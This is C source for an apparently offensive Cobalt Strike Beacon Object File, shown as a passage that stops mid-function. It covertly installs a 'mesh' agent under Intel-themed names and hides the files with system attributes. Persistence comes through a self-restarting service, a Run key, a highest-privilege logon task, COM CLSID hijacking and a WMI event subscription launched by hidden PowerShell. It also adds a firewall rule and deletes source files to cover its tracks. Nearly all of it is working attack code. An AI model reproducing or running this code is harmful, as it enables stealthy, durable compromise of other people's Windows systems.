#include "beacon.h"
#include <windows.h>
#include <winsvc.h>

#ifndef SC_MANAGER_CREATE_SERVICE
#define SC_MANAGER_CREATE_SERVICE 0x0002
#endif
#ifndef SERVICE_WIN32_OWN_PROCESS
#define SERVICE_WIN32_OWN_PROCESS 0x00000010
#endif
#ifndef SERVICE_AUTO_START
#define SERVICE_AUTO_START 0x00000002
#endif
#ifndef SERVICE_ERROR_NORMAL
#define SERVICE_ERROR_NORMAL 0x00000001
#endif
#ifndef SERVICE_ALL_ACCESS
#define SERVICE_ALL_ACCESS 0xF01FF
#endif
#ifndef ERROR_SERVICE_EXISTS
#define ERROR_SERVICE_EXISTS 1073
#endif
#ifndef ERROR_SERVICE_ALREADY_RUNNING
#define ERROR_SERVICE_ALREADY_RUNNING 1056
#endif
#ifndef SERVICE_CONFIG_FAILURE_ACTIONS
#define SERVICE_CONFIG_FAILURE_ACTIONS 2
#endif
#ifndef SERVICE_CONFIG_DELAYED_AUTO_START_INFO
#define SERVICE_CONFIG_DELAYED_AUTO_START_INFO 3
#endif
#ifndef SC_ACTION_RESTART
#define SC_ACTION_RESTART 1
#endif
#ifndef GENERIC_READ
#define GENERIC_READ 0x80000000L
#endif
#ifndef FILE_SHARE_READ
#define FILE_SHARE_READ 0x00000001
#endif
#ifndef OPEN_EXISTING
#define OPEN_EXISTING 3
#endif
#ifndef INVALID_HANDLE_VALUE
#define INVALID_HANDLE_VALUE ((HANDLE)(LONG_PTR)-1)
#endif
#ifndef INVALID_FILE_SIZE
#define INVALID_FILE_SIZE ((DWORD)0xFFFFFFFF)
#endif
#ifndef MEM_COMMIT
#define MEM_COMMIT 0x1000
#endif
#ifndef MEM_RESERVE
#define MEM_RESERVE 0x2000
#endif
#ifndef MEM_RELEASE
#define MEM_RELEASE 0x8000
#endif
#ifndef PAGE_READWRITE
#define PAGE_READWRITE 0x04
#endif
#ifndef CREATE_NO_WINDOW
#define CREATE_NO_WINDOW 0x08000000
#endif
#ifndef STARTF_USESHOWWINDOW
#define STARTF_USESHOWWINDOW 0x00000001
#endif
#ifndef FILE_ATTRIBUTE_HIDDEN
#define FILE_ATTRIBUTE_HIDDEN 0x00000002
#endif
#ifndef FILE_ATTRIBUTE_SYSTEM
#define FILE_ATTRIBUTE_SYSTEM 0x00000004
#endif
#ifndef SERVICE_CONTROL_STOP
#define SERVICE_CONTROL_STOP 0x00000001
#endif
#ifndef DELETE
#define DELETE 0x00010000L
#endif
#ifndef SERVICE_STOP
#define SERVICE_STOP 0x0020
#endif
#ifndef SERVICE_QUERY_STATUS
#define SERVICE_QUERY_STATUS 0x0004
#endif
#ifndef KEY_SET_VALUE
#define KEY_SET_VALUE 0x0002
#endif
#ifndef KEY_CREATE_SUB_KEY
#define KEY_CREATE_SUB_KEY 0x0004
#endif
#ifndef REG_SZ
#define REG_SZ 1
#endif
#ifndef REG_DWORD
#define REG_DWORD 4
#endif
#ifndef REG_OPTION_NON_VOLATILE
#define REG_OPTION_NON_VOLATILE 0
#endif
#ifndef HKEY_LOCAL_MACHINE
#define HKEY_LOCAL_MACHINE ((HKEY)(ULONG_PTR)0x80000002)
#endif
#ifndef HKEY_CURRENT_USER
#define HKEY_CURRENT_USER ((HKEY)(ULONG_PTR)0x80000001)
#endif
#ifndef ERROR_SUCCESS
#define ERROR_SUCCESS 0L
#endif

#define REG_KEY "SOFTWARE\\Intel\\PowerManager"
#define REG_VAL "Data"
#define REG_CONF_SPEC "reg:HKLM\\SOFTWARE\\Intel\\PowerManager\\Data"

WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI BOOL WINAPI KERNEL32$CreateDirectoryA(LPCSTR, LPSECURITY_ATTRIBUTES);
WINBASEAPI BOOL WINAPI KERNEL32$CopyFileA(LPCSTR, LPCSTR, BOOL);
WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileAttributesA(LPCSTR);
WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileA(LPCSTR);
WINBASEAPI BOOL WINAPI KERNEL32$RemoveDirectoryA(LPCSTR);
WINBASEAPI BOOL WINAPI KERNEL32$SetFileAttributesA(LPCSTR, DWORD);
WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerA(LPCSTR, LPCSTR, DWORD);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceA(SC_HANDLE, LPCSTR, LPCSTR, DWORD, DWORD, DWORD, DWORD, LPCSTR, LPCSTR, LPDWORD, LPCSTR, LPCSTR, LPCSTR);
WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceA(SC_HANDLE, LPCSTR, DWORD);
WINADVAPI BOOL WINAPI ADVAPI32$StartServiceA(SC_HANDLE, DWORD, LPCSTR *);
WINADVAPI BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$ChangeServiceConfig2A(SC_HANDLE, DWORD, LPVOID);
WINADVAPI BOOL WINAPI ADVAPI32$ControlService(SC_HANDLE, DWORD, LPSERVICE_STATUS);
WINADVAPI BOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE);
WINADVAPI BOOL WINAPI ADVAPI32$QueryServiceStatus(SC_HANDLE, LPSERVICE_STATUS);
WINADVAPI LONG WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
WINADVAPI LONG WINAPI ADVAPI32$RegDeleteValueA(HKEY, LPCSTR);
WINADVAPI LONG WINAPI ADVAPI32$RegDeleteKeyA(HKEY, LPCSTR);
WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY);
WINBASEAPI int __cdecl MSVCRT$_snprintf(char *, size_t, const char *, ...);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char *);
WINBASEAPI int __cdecl MSVCRT$_strnicmp(const char *, const char *, size_t);
WINBASEAPI int __cdecl MSVCRT$atoi(const char *);
WINBASEAPI int __cdecl MSVCRT$_stricmp(const char *, const char *);
WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE, LPDWORD);
WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
WINBASEAPI DWORD WINAPI KERNEL32$WaitForSingleObject(HANDLE, DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$GetExitCodeProcess(HANDLE, LPDWORD);

typedef struct _SC_ACTION_B {
    DWORD Type;
    DWORD Delay;
} SC_ACTION_B;

typedef struct _SERVICE_FAILURE_ACTIONS_B {
    DWORD dwResetPeriod;
    LPSTR lpRebootMsg;
    LPSTR lpCommand;
    DWORD cActions;
    SC_ACTION_B *lpsaActions;
} SERVICE_FAILURE_ACTIONS_B;

typedef struct _SERVICE_DELAYED_AUTO_START_INFO_B {
    BOOL fDelayedAutostart;
} SERVICE_DELAYED_AUTO_START_INFO_B;

static int nonempty(const char *s)
{
    return s && s[0];
}

static int parse_listen_port(const char *s)
{
    const char *p;
    if (!s)
        return 0;
    for (p = s; *p; p++) {
        if (p != s && p[-1] != '\n' && p[-1] != '\r')
            continue;
        while (*p == ' ' || *p == '\t')
            p++;
        if (MSVCRT$_strnicmp(p, "ListenPort", 10) != 0)
            continue;
        p += 10;
        while (*p == ' ' || *p == '\t')
            p++;
        if (*p != '=')
            continue;
        p++;
        while (*p == ' ' || *p == '\t')
            p++;
        return MSVCRT$atoi(p);
    }
    return 0;
}

static char *read_all(const char *path, DWORD *outn)
{
    HANDLE h;
    DWORD n = 0, sz;
    char *buf;

    *outn = 0;
    h = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (h == INVALID_HANDLE_VALUE)
        return NULL;
    sz = KERNEL32$GetFileSize(h, NULL);
    if (sz == INVALID_FILE_SIZE || sz == 0 || sz > 65536) {
        KERNEL32$CloseHandle(h);
        return NULL;
    }
    buf = (char *)KERNEL32$VirtualAlloc(NULL, sz + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) {
        KERNEL32$CloseHandle(h);
        return NULL;
    }
    if (!KERNEL32$ReadFile(h, buf, sz, &n, NULL)) {
        KERNEL32$VirtualFree(buf, 0, MEM_RELEASE);
        KERNEL32$CloseHandle(h);
        return NULL;
    }
    buf[n] = 0;
    KERNEL32$CloseHandle(h);
    *outn = n;
    return buf;
}

static void zmem(void *q, unsigned n)
{
    unsigned i;
    char *p = (char *)q;
    for (i = 0; i < n; i++)
        p[i] = 0;
}

static DWORD run_hidden_ex(const char *cmd, int waitms)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char buf[2048];
    DWORD code = 1;

    zmem(&si, sizeof(si));
    zmem(&pi, sizeof(pi));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    MSVCRT$_snprintf(buf, sizeof(buf), "%s", cmd);
    if (!KERNEL32$CreateProcessA(NULL, buf, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return KERNEL32$GetLastError();
    if (waitms > 0) {
        KERNEL32$WaitForSingleObject(pi.hProcess, (DWORD)waitms);
        KERNEL32$GetExitCodeProcess(pi.hProcess, &code);
    } else {
        code = pi.dwProcessId;
    }
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);
    return code;
}

static void run_hidden(const char *cmd)
{
    run_hidden_ex(cmd, 15000);
}

static int has_m(const char *list, const char *want)
{
    const char *p;
    int n;
    if (!nonempty(list) || !want)
        return 0;
    n = (int)MSVCRT$strlen(want);
    p = list;
    while (*p) {
        while (*p == ',' || *p == '+' || *p == ' ' || *p == '\t')
            p++;
        if (!*p)
            break;
        if (MSVCRT$_strnicmp(p, want, n) == 0 && (p[n] == 0 || p[n] == ',' || p[n] == '+' || p[n] == ' ' || p[n] == '\t'))
            return 1;
        while (*p && *p != ',' && *p != '+')
            p++;
    }
    return 0;
}

static int want_svc(const char *m) { return has_m(m, "svc") || has_m(m, "service"); }
static int want_run(const char *m) { return has_m(m, "run") || has_m(m, "autostart"); }
static int want_task(const char *m) { return has_m(m, "schtask") || has_m(m, "onlogon") || has_m(m, "task"); }
static int want_clsid(const char *m) { return has_m(m, "clsid") || has_m(m, "com"); }
static int want_wmi(const char *m) { return has_m(m, "wmi"); }

static void open_udp(int port)
{
    char cmd[640];
    if (port <= 0 || port > 65535)
        return;
    MSVCRT$_snprintf(
        cmd,
        sizeof(cmd),
        "C:\\Windows\\System32\\netsh.exe advfirewall firewall add rule name=RiptideWG-%d dir=in action=allow protocol=UDP localport=%d profile=any",
        port,
        port);
    run_hidden(cmd);
    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] firewall udp/%d\n", port);
}

static void hide_path(const char *path)
{
    KERNEL32$SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

static int write_reg_conf(const char *text, DWORD n)
{
    HKEY hk = NULL;
    LONG st;
    DWORD disp = 0;

    st = ADVAPI32$RegCreateKeyExA(
        HKEY_LOCAL_MACHINE, REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_CREATE_SUB_KEY, NULL, &hk, &disp);
    if (st != ERROR_SUCCESS || !hk) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] RegCreateKey %ld\n", st);
        return 0;
    }
    st = ADVAPI32$RegSetValueExA(hk, REG_VAL, 0, REG_SZ, (const BYTE *)text, n + 1);
    ADVAPI32$RegCloseKey(hk);
    if (st != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] RegSetValue %ld\n", st);
        return 0;
    }
    return 1;
}

static void start_svc(const char *svc, const char *binpath)
{
    SC_HANDLE scm, hsvc;
    DWORD err;
    SC_ACTION_B actions[3];
    SERVICE_FAILURE_ACTIONS_B fa;
    SERVICE_DELAYED_AUTO_START_INFO_B delayed;

    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!scm) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] OpenSCManager err=%u (need SYSTEM/admin)\n", KERNEL32$GetLastError());
        return;
    }
    hsvc = ADVAPI32$CreateServiceA(
        scm, svc, svc, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, binpath,
        NULL, NULL, NULL, "NT AUTHORITY\\NetworkService", NULL);
    if (!hsvc) {
        err = KERNEL32$GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
            hsvc = ADVAPI32$OpenServiceA(scm, svc, SERVICE_ALL_ACCESS);
        if (!hsvc) {
            BeaconPrintf(CALLBACK_ERROR, "[mesh] CreateService err=%u\n", err);
            ADVAPI32$CloseServiceHandle(scm);
            return;
        }
    }
    delayed.fDelayedAutostart = TRUE;
    ADVAPI32$ChangeServiceConfig2A(hsvc, SERVICE_CONFIG_DELAYED_AUTO_START_INFO, &delayed);
    actions[0].Type = SC_ACTION_RESTART;
    actions[0].Delay = 5000;
    actions[1].Type = SC_ACTION_RESTART;
    actions[1].Delay = 5000;
    actions[2].Type = SC_ACTION_RESTART;
    actions[2].Delay = 5000;
    fa.dwResetPeriod = 86400;
    fa.lpRebootMsg = NULL;
    fa.lpCommand = NULL;
    fa.cActions = 3;
    fa.lpsaActions = actions;
    ADVAPI32$ChangeServiceConfig2A(hsvc, SERVICE_CONFIG_FAILURE_ACTIONS, &fa);
    if (!ADVAPI32$StartServiceA(hsvc, 0, NULL)) {
        err = KERNEL32$GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            BeaconPrintf(CALLBACK_ERROR, "[mesh] StartService err=%u\n", err);
            ADVAPI32$CloseServiceHandle(hsvc);
            ADVAPI32$CloseServiceHandle(scm);
            return;
        }
    }
    ADVAPI32$CloseServiceHandle(hsvc);
    ADVAPI32$CloseServiceHandle(scm);
}

#define CLSID_MESH "{8B4E3D9A-6C2F-4A11-9D4E-B7C1A2E3F405}"

static void persist_run(const char *name, const char *binpath)
{
    HKEY hk = NULL;
    if (ADVAPI32$RegCreateKeyExA(
            HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, NULL, 0, KEY_SET_VALUE | KEY_CREATE_SUB_KEY, NULL, &hk, NULL) != ERROR_SUCCESS ||
        !hk)
        return;
    ADVAPI32$RegSetValueExA(hk, name, 0, REG_SZ, (const BYTE *)binpath, (DWORD)MSVCRT$strlen(binpath) + 1);
    ADVAPI32$RegCloseKey(hk);
    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist run HKCU\\...\\Run\\%s\n", name);
}

static void persist_schtask(const char *name, const char *binpath)
{
    char cmd[2048];
    MSVCRT$_snprintf(
        cmd, sizeof(cmd),
        "C:\\Windows\\System32\\schtasks.exe /create /tn \"%s\" /tr \"%s\" /sc ONLOGON /rl HIGHEST /f",
        name, binpath);
    run_hidden(cmd);
    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist schtask onlogon %s\n", name);
}

static void persist_clsid(const char *binpath)
{
    HKEY hk = NULL;
    char key[180];
    char launch[2048];
    MSVCRT$_snprintf(key, sizeof(key), "Software\\Classes\\CLSID\\%s\\LocalServer32", CLSID_MESH);
    if (ADVAPI32$RegCreateKeyExA(HKEY_CURRENT_USER, key, 0, NULL, 0, KEY_SET_VALUE | KEY_CREATE_SUB_KEY, NULL, &hk, NULL) == ERROR_SUCCESS && hk) {
        ADVAPI32$RegSetValueExA(hk, NULL, 0, REG_SZ, (const BYTE *)binpath, (DWORD)MSVCRT$strlen(binpath) + 1);
        ADVAPI32$RegCloseKey(hk);
    }
    /* logon fires CoCreate of our LocalServer32 */
    MSVCRT$_snprintf(
        launch, sizeof(launch),
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -C \"[activator]::CreateInstance([type]::GetTypeFromCLSID('%s'))\"",
        CLSID_MESH);
    persist_schtask("IntelPmaCOM", launch);
    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist clsid %s LocalServer32\n", CLSID_MESH);
}

static void persist_wmi(const char *binpath)
{
    char cmd[2048];
    MSVCRT$_snprintf(
        cmd, sizeof(cmd),
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -C \""
        "$n='IntelPma'; $p='%s'; "
        "$ns='root\\subscription'; "
        "Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding -EA 0 | ? { $_.Filter -match $n } | %% { $_.Delete() }; "
        "Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -EA 0 | ? { $_.Name -eq $n } | %% { $_.Delete() }; "
        "Get-WmiObject -Namespace $ns -Class __EventFilter -EA 0 | ? { $_.Name -eq $n } | %% { $_.Delete() }; "
        "$q=\\\"SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'\\\"; "
        "$f=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{Name=$n;EventNameSpace='root\\cimv2';QueryLanguage='WQL';Query=$q}; "
        "$c=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{Name=$n;CommandLineTemplate=$p}; "
        "Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c} | Out-Null"
        "\"",
        binpath);
    run_hidden(cmd);
    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] persist wmi logon consumer IntelPma\n");
}

static DWORD spawn_line(const char *line)
{
    DWORD pid = run_hidden_ex(line, 0);
    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] ram pid=%u\n", pid);
    return pid;
}

static int tcp_open(const char *ip, int port)
{
    struct {
        short family;
        unsigned short port;
        unsigned long addr;
        char zero[8];
    } a;
    UINT_PTR s;
    typedef int (*t_WSAStartup)(WORD, void *);
    typedef UINT_PTR (*t_socket)(int, int, int);
    typedef int (*t_connect)(UINT_PTR, const void *, int);
    typedef int (*t_closesocket)(UINT_PTR);
    typedef unsigned long (*t_inet_addr)(const char *);
    typedef unsigned short (*t_htons)(unsigned short);
    typedef int (*t_ioctlsocket)(UINT_PTR, long, unsigned long *);
    t_WSAStartup pWSAStartup;
    t_socket pSocket;
    t_connect pConnect;
    t_closesocket pClose;
    t_inet_addr pInet;
    t_htons pHtons;
    t_ioctlsocket pIoctl;
    HMODULE w;
    char wsa[400];
    int ok = 0;

    w = KERNEL32$LoadLibraryA("ws2_32.dll");
    if (!w)
        return 0;
    pWSAStartup = (t_WSAStartup)KERNEL32$GetProcAddress(w, "WSAStartup");
    pSocket = (t_socket)KERNEL32$GetProcAddress(w, "socket");
    pConnect = (t_connect)KERNEL32$GetProcAddress(w, "connect");
    pClose = (t_closesocket)KERNEL32$GetProcAddress(w, "closesocket");
    pInet = (t_inet_addr)KERNEL32$GetProcAddress(w, "inet_addr");
    pHtons = (t_htons)KERNEL32$GetProcAddress(w, "htons");
    pIoctl = (t_ioctlsocket)KERNEL32$GetProcAddress(w, "ioctlsocket");
    if (!pWSAStartup || !pSocket || !pConnect || !pClose || !pInet || !pHtons)
        return 0;
    zmem(wsa, sizeof(wsa));
    pWSAStartup(0x0202, wsa);
    s = pSocket(2, 1, 6);
    if (s == (UINT_PTR)(ULONG_PTR)(~0))
        return 0;
    zmem(&a, sizeof(a));
    a.family = 2;
    a.port = pHtons((unsigned short)port);
    a.addr = pInet(ip);
    ok = (pConnect(s, &a, sizeof(a)) == 0);
    if (!ok)
        KERNEL32$Sleep(150);
    if (!ok)
        ok = (pConnect(s, &a, sizeof(a)) == 0);
    pClose(s);
    return ok;
}

static void cmd_checkin(void)
{
    int p1080, p8080, p7670, p7668;
    SC_HANDLE scm, hsvc;
    SERVICE_STATUS st;
    int svc_on = 0;
    char line[320];
    char ports[80];
    int any = 0;

    p1080 = tcp_open("127.0.0.1", 1080);
    p8080 = tcp_open("127.0.0.1", 8080);
    p7670 = tcp_open("127.0.0.1", 7670);
    p7668 = tcp_open("127.0.0.1", 7668);
    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (scm) {
        hsvc = ADVAPI32$OpenServiceA(scm, "IntelPma", SERVICE_QUERY_STATUS);
        if (hsvc) {
            zmem(&st, sizeof(st));
            if (ADVAPI32$QueryServiceStatus(hsvc, &st) && st.dwCurrentState == 4)
                svc_on = 1;
            ADVAPI32$CloseServiceHandle(hsvc);
        }
        ADVAPI32$CloseServiceHandle(scm);
    }
    any = p1080 || p8080 || p7670 || p7668 || svc_on;
    ports[0] = 0;
    if (p1080) {
        MSVCRT$_snprintf(line, sizeof(line), "%s :1080", ports);
        MSVCRT$_snprintf(ports, sizeof(ports), "%s", line);
    }
    if (p8080) {
        MSVCRT$_snprintf(line, sizeof(line), "%s :8080", ports);
        MSVCRT$_snprintf(ports, sizeof(ports), "%s", line);
    }
    if (p7670) {
        MSVCRT$_snprintf(line, sizeof(line), "%s :7670", ports);
        MSVCRT$_snprintf(ports, sizeof(ports), "%s", line);
    }
    if (p7668) {
        MSVCRT$_snprintf(line, sizeof(line), "%s :7668", ports);
        MSVCRT$_snprintf(ports, sizeof(ports), "%s", line);
    }
    BeaconPrintf(
        CALLBACK_OUTPUT,
        "[mesh] %s%s  svc=%s  1080=%s 8080=%s 7670=%s 7668=%s\n",
        any ? "on" : "off",
        any ? ports : "",
        svc_on ? "on" : "off",
        p1080 ? "on" : "off",
        p8080 ? "on" : "off",
        p7670 ? "on" : "off",
        p7668 ? "on" : "off");
}

static void cmd_ram(const char *src_exe, const char *src_conf)
{
    char line[MAX_PATH * 3];
    if (!nonempty(src_exe)) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] ram needs exe\n");
        return;
    }
    if (KERNEL32$GetFileAttributesA(src_exe) == INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] exe missing %s\n", src_exe);
        return;
    }
    if (nonempty(src_conf))
        MSVCRT$_snprintf(line, sizeof(line), "\"%s\" --config \"%s\"", src_exe, src_conf);
    else
        MSVCRT$_snprintf(line, sizeof(line), "\"%s\"", src_exe);
    spawn_line(line);
}

static void cmd_install(const char *src_exe, const char *src_conf, const char *svc, int hub, const char *methods)
{
    char pf[MAX_PATH];
    char dest_dir[MAX_PATH];
    char dest_exe[MAX_PATH];
    char dest_conf[MAX_PATH];
    char binpath[MAX_PATH * 2];
    char intel[MAX_PATH];
    char *confbuf;
    DWORD confn = 0;
    int listen = 0;
    int persist;

    persist = nonempty(methods);
    if (!nonempty(src_exe)) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] need src exe\n");
        return;
    }
    if (!nonempty(svc))
        svc = "IntelPma";
    if (KERNEL32$GetFileAttributesA(src_exe) == INVALID_FILE_ATTRIBUTES) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] exe missing %s err=%u\n", src_exe, KERNEL32$GetLastError());
        return;
    }

    if (persist) {
        if (!KERNEL32$GetEnvironmentVariableA("ProgramData", pf, MAX_PATH)) {
            BeaconPrintf(CALLBACK_ERROR, "[mesh] ProgramData err=%u\n", KERNEL32$GetLastError());
            return;
        }
        MSVCRT$_snprintf(intel, MAX_PATH, "%s\\Intel", pf);
        MSVCRT$_snprintf(dest_dir, MAX_PATH, "%s\\Intel\\Ipma", pf);
        MSVCRT$_snprintf(dest_exe, MAX_PATH, "%s\\ipmasvc.exe", dest_dir);
        KERNEL32$CreateDirectoryA(intel, NULL);
        KERNEL32$CreateDirectoryA(dest_dir, NULL);
        hide_path(dest_dir);
        if (!KERNEL32$CopyFileA(src_exe, dest_exe, FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "[mesh] CopyFile exe err=%u\n", KERNEL32$GetLastError());
            return;
        }
        hide_path(dest_exe);
        if (nonempty(src_conf)) {
            confbuf = read_all(src_conf, &confn);
            if (!confbuf) {
                BeaconPrintf(CALLBACK_ERROR, "[mesh] read conf err=%u\n", KERNEL32$GetLastError());
                return;
            }
            listen = parse_listen_port(confbuf);
            if (!write_reg_conf(confbuf, confn)) {
                KERNEL32$VirtualFree(confbuf, 0, MEM_RELEASE);
                return;
            }
            KERNEL32$VirtualFree(confbuf, 0, MEM_RELEASE);
            KERNEL32$DeleteFileA(src_conf);
        }
        KERNEL32$DeleteFileA(src_exe);
        MSVCRT$_snprintf(
            binpath, sizeof(binpath),
            "\"%s\" --config %s --svc %s", dest_exe, REG_CONF_SPEC, svc);
        {
            char plain[MAX_PATH * 2];
            MSVCRT$_snprintf(plain, sizeof(plain), "%s --config %s --svc %s", dest_exe, REG_CONF_SPEC, svc);
            if (want_svc(methods))
                start_svc(svc, binpath);
            if (want_run(methods))
                persist_run(svc, plain);
            if (want_task(methods))
                persist_schtask(svc, plain);
            if (want_clsid(methods))
                persist_clsid(plain);
            if (want_wmi(methods))
                persist_wmi(plain);
            if (!want_svc(methods))
                spawn_line(binpath);
        }
        if (hub && listen > 0)
            open_udp(listen);
        BeaconPrintf(
            CALLBACK_OUTPUT,
            "[mesh] persist methods=%s  1 file %s  conf HKLM\\%s\\%s\n",
            methods, dest_exe, REG_KEY, REG_VAL);
        return;
    }

    if (!KERNEL32$GetEnvironmentVariableA("ProgramFiles", pf, MAX_PATH)) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] ProgramFiles err=%u\n", KERNEL32$GetLastError());
        return;
    }
    MSVCRT$_snprintf(dest_dir, MAX_PATH, "%s\\Riptide", pf);
    MSVCRT$_snprintf(dest_exe, MAX_PATH, "%s\\riptide-agent.exe", dest_dir);
    MSVCRT$_snprintf(dest_conf, MAX_PATH, "%s\\peer.conf", dest_dir);
    KERNEL32$CreateDirectoryA(dest_dir, NULL);
    if (!KERNEL32$CopyFileA(src_exe, dest_exe, FALSE)) {
        BeaconPrintf(CALLBACK_ERROR, "[mesh] CopyFile exe err=%u\n", KERNEL32$GetLastError());
        return;
    }
    if (nonempty(src_conf)) {
        if (!KERNEL32$CopyFileA(src_conf, dest_conf, FALSE)) {
            BeaconPrintf(CALLBACK_ERROR, "[mesh] CopyFile conf err=%u\n", KERNEL32$GetLastError());
            return;
        }
        confbuf = read_all(dest_conf, &confn);
        if (confbuf) {
            listen = parse_listen_port(confbuf);
            KERNEL32$VirtualFree(confbuf, 0, MEM_RELEASE);
        }
    }
    MSVCRT$_snprintf(binpath, sizeof(binpath), "\"%s\" --config \"%s\" --svc %s", dest_exe, dest_conf, svc);
    spawn_line(binpath);
    if ((hub || listen > 0) && listen > 0)
        open_udp(listen);
    BeaconPrintf(CALLBACK_OUTPUT, "[mesh] session install %s  exe=%s  (no persist)\n", svc, dest_exe);
}

static void zap_svc(const char *svc)
{
    SC_HANDLE scm, hsvc;
    SERVICE_STATUS st;

    if (!nonempty(svc))
        return;
    scm = ADVAPI32$OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm)
        return;
    hsvc = ADVAPI32$OpenServiceA(scm, svc, DELETE | SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (hsvc) {
        ADVAPI32$ControlService(hsvc, SERVICE_CONTROL_STOP, &st);
        KERNEL32$Sleep(1200);
        if (ADVAPI32$DeleteService(hsvc))
            BeaconPrintf(CALLBACK_OUTPUT, "[mesh] deleted service %s\n", svc);
        ADVAPI32$CloseServiceHandle(hsvc);
    }
    ADVAPI32$CloseServiceHandle(scm);
}

static void zap_file(const char *path)
{
    KERNEL32$SetFileAttributesA(path, 0x80); /* FILE_ATTRIBUTE_NORMAL */
    if (KERNEL32$DeleteFileA(path))
        BeaconPrintf(CALLBACK_OUTPUT, "[mesh] del %s\n", path);
}

static void cmd_clear(const char *svc)
{
    char pf[MAX_PATH], pd[MAX_PATH];
    char p[MAX_PATH];
    HKEY hk = NULL;
    char cmd[320];

    if (nonempty(svc))
        zap_svc(svc);
    zap_svc("IntelPma");
    zap_svc("IntelPmaHub");
    zap_svc("RiptideAgent");

    if (KERNEL32$GetEnvironmentVariableA("ProgramFiles", pf, MAX_PATH)) {
        MSVCRT$_snprintf(p, MAX_PATH, "%s\\Riptide\\riptide-agent.exe", pf);
        zap_file(p);
        MSVCRT$_snprintf(p, MAX_PATH, "%s\\Riptide\\peer.conf", pf);
        zap_file(p);
        MSVCRT$_snprintf(p, MAX_PATH, "%s\\Riptide", pf);
